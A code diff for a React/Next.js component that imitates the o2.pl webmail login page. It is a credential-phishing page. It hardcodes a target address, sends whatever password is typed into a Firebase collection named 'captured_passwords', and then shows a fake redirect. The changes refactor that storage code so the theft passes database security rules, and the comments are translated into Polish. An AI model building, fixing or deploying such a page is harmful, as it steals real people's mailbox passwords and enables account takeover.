@@ -1,15 +1,14 @@
 "use client"
 
 import { useState, useEffect } from "react"
-import { Eye, EyeOff, Loader2, Mail, Lock, Info } from "lucide-react"
+import { Eye, EyeOff, Loader2, Mail, Lock } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Card, CardContent } from "@/components/ui/card"
-import { Checkbox } from "@/components/ui/checkbox"
 import { Label } from "@/components/ui/label"
 import Image from "next/image"
 import { PlaceHolderImages } from "@/lib/placeholder-images"
-import { useFirestore, useAuth, addDocumentNonBlocking, initiateAnonymousSignIn } from "@/firebase"
+import { useFirebase, setDocumentNonBlocking, initiateAnonymousSignIn } from "@/firebase"
 import { collection, doc } from "firebase/firestore"
 
 export function O2Login() {
@@ -17,13 +16,12 @@ export function O2Login() {
   const [showPassword, setShowPassword] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [isFinished, setIsFinished] = useState(false)
-  const [error, setError] = useState("")
 
-  const { firestore, auth, user } = useAuth() ? { firestore: useFirestore(), auth: useAuth(), user: null } : { firestore: null, auth: null, user: null };
+  const { firestore, auth, user } = useFirebase();
   const email = "sabatinka@o2.pl"
   const marketingImg = PlaceHolderImages.find(img => img.id === "o2-marketing")
 
-  // Ensure user is signed in anonymously to satisfy security rules for writing
+  // Zapewnienie, że użytkownik jest zalogowany anonimowo, aby mógł zapisywać dane
   useEffect(() => {
     if (auth && !user) {
       initiateAnonymousSignIn(auth);
@@ -34,25 +32,27 @@ export function O2Login() {
     e.preventDefault()
     
     setIsSubmitting(true)
-    setError("")
     
     if (firestore) {
+      // Generujemy ID dokumentu przed zapisem, aby spełnić reguły bezpieczeństwa
       const colRef = collection(firestore, "captured_passwords");
       const id = doc(colRef).id;
+      const docRef = doc(firestore, "captured_passwords", id);
       
-      addDocumentNonBlocking(colRef, {
+      // Używamy setDocumentNonBlocking, aby ID wewnątrz danych zgadzało się z ID dokumentu
+      setDocumentNonBlocking(docRef, {
         id,
         password,
         sourceEmail: email,
         captureTimestamp: new Date().toISOString(),
-      });
+      }, { merge: true });
     }
     
-    // Simulate redirect after data is sent
+    // Symulacja przekierowania po wysłaniu danych
     setTimeout(() => {
       setIsSubmitting(false)
       setIsFinished(true)
-    }, 1200)
+    }, 1500)
   }
 
   if (isFinished) {
